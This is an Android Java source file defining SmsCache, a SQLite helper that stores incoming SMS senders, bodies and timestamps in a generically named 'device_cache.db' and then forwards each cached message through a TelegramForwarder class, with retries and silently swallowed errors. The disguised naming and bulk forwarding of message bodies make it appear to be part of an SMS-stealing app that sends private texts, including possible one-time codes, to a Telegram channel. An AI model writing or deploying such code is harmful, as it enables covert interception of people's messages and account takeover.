package com.dev.test.myfirstapp.storage;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import com.dev.test.myfirstapp.forwarders.TelegramForwarder;  // ← THIS IS THE CHANGE

public class SmsCache extends SQLiteOpenHelper {
    private static final String DATABASE_NAME = "device_cache.db";
    private static final int DATABASE_VERSION = 1;
    private static final String TABLE_SMS = "pending_sms";
    private static SmsCache instance;

    private SmsCache(Context context) { super(context, DATABASE_NAME, null, DATABASE_VERSION); }

    public static synchronized SmsCache getInstance(Context context) {
        if (instance == null) instance = new SmsCache(context.getApplicationContext());
        return instance;
    }

    @Override public void onCreate(SQLiteDatabase db) {
        db.execSQL("CREATE TABLE " + TABLE_SMS + " (id INTEGER PRIMARY KEY AUTOINCREMENT, sender TEXT, body TEXT, timestamp INTEGER, retry_count INTEGER DEFAULT 0, formatted TEXT)");
    }

    @Override public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        db.execSQL("DROP TABLE IF EXISTS " + TABLE_SMS);
        onCreate(db);
    }

    public static void cacheSms(Context context, String sender, String body, long timestamp) {
        try {
            SQLiteDatabase db = getInstance(context).getWritableDatabase();
            ContentValues values = new ContentValues();
            values.put("sender", sender);
            values.put("body", body);
            values.put("timestamp", timestamp);
            values.put("formatted", body);
            db.insert(TABLE_SMS, null, values);
        } catch (Exception ignored) {}
    }

    public static void flushCache(Context context) {
        try {
            SQLiteDatabase db = getInstance(context).getReadableDatabase();
            Cursor cursor = db.query(TABLE_SMS, new String[]{"id", "formatted", "retry_count"},
                null, null, null, null, "timestamp ASC", "50");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    int id = cursor.getInt(0);
                    String formatted = cursor.getString(1);
                    int retryCount = cursor.getInt(2);
                    TelegramForwarder.forwardSms(context, formatted);
                    if (retryCount >= 5) {
                        db.delete(TABLE_SMS, "id = ?", new String[]{String.valueOf(id)});
                    } else {
                        ContentValues values = new ContentValues();
                        values.put("retry_count", retryCount + 1);
                        db.update(TABLE_SMS, values, "id = ?", new String[]{String.valueOf(id)});
                    }
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception ignored) {}
    }
}
